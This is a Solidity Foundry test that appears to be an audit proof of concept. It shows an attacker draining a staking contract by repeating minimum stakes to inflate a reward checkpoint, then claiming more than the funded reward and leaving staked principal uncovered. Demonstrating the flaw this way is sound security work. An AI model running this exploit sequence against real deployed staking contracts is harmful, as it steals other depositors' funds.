// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Staking} from "src/Staking/Staking.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "test/helpers/BaseTest.sol";

contract PlantPoC is BaseTest {
    uint64 internal constant REWARD_DURATION = 30 days;
    uint128 internal constant VICTIM_STAKE = 10_000 ether;
    uint128 internal constant ATTACKER_STAKE = 100 ether;
    uint256 internal constant REWARD_AMOUNT = 100 ether;

    Staking internal staking;
    MockERC20 internal token;
    address internal attacker;
    address internal victim;
    uint8 internal tier30;

    function setUp() public override {
        super.setUp();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        token = deployMockToken("STK", 18);

        vm.startPrank(owner);
        staking = new Staking(IERC20(address(token)), address(token), 1_000);
        tier30 = staking.setLockTier(30 days, 10_000);
        token.mint(owner, REWARD_AMOUNT);
        token.approve(address(staking), type(uint256).max);
        vm.stopPrank();

        mintAndApprove(token, victim, address(staking), VICTIM_STAKE);
        mintAndApprove(token, attacker, address(staking), ATTACKER_STAKE + 64 * staking.MIN_STAKE_AMOUNT());
    }

    function testPoC_rewardCheckpointInflationDrainsStakedPrincipal() public {
        vm.prank(victim);
        staking.stake(VICTIM_STAKE, tier30);

        vm.prank(attacker);
        staking.stake(ATTACKER_STAKE, tier30);

        vm.prank(owner);
        staking.notifyRewardAmount(address(token), REWARD_AMOUNT);

        advanceSeconds(REWARD_DURATION / 2);

        uint256 fairEarned = staking.earned(attacker, address(token));
        assertLt(fairEarned, 1 ether, "attacker should have only a small pro-rata reward");

        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 minStake = staking.MIN_STAKE_AMOUNT();

        vm.startPrank(attacker);
        for (uint256 i; i < 13; ++i) {
            staking.stake(uint128(minStake), tier30);
        }
        staking.claim(address(token));
        vm.stopPrank();

        uint256 attackerClaimed = token.balanceOf(attacker) - attackerBalanceBefore;

        assertGt(attackerClaimed, REWARD_AMOUNT, "attacker claimed more than the funded reward stream");
        assertLt(token.balanceOf(address(staking)), staking.totalRawSupply(), "pool cannot cover remaining staked principal");
    }
}
